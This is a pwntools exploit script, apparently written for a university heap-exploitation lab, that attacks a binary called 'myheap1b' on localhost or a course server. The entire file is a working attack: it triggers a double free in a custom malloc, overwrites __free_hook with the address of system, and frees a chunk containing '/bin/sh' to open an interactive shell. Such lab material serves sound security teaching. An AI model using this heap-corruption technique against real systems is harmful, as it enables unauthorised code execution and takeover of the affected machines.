#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template myheap1b
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'myheap1b')
mal = ELF('malloc-2.7.2.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4466)
    else:
        return remote('localhost', 4466)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RPATH:    b'.'

# setarch -R ./myheap1

io = start()

import time

def add(k, value=cyclic(8)):
    # also frees at the start
    io.send(b'a')
    time.sleep(0.01)
    io.send(k)
    time.sleep(0.01)
    io.send(value)
    time.sleep(0.01)

def free(k):
    io.send(b'd')
    time.sleep(0.01)
    io.send(k)
    time.sleep(0.01)

# first address where malloc.so is in vmmap
# todo: find out why __free_hook was not showing
mal.address = 0x7ffff7fc3000

add(b'A')
add(b'Z', flat({0: "/bin/sh"}))
add(b'Y')
add(b'K')

# double free
free(b'A')
free(b'A') # can skip the next one if the next add is to a

print(hex(mal.sym['__free_hook']))

add(b'B', flat({0: mal.sym['__free_hook']-16}))
add(b'C')
add(b'D', flat({0: exe.plt['system']}))
free(b'Z')

io.interactive()

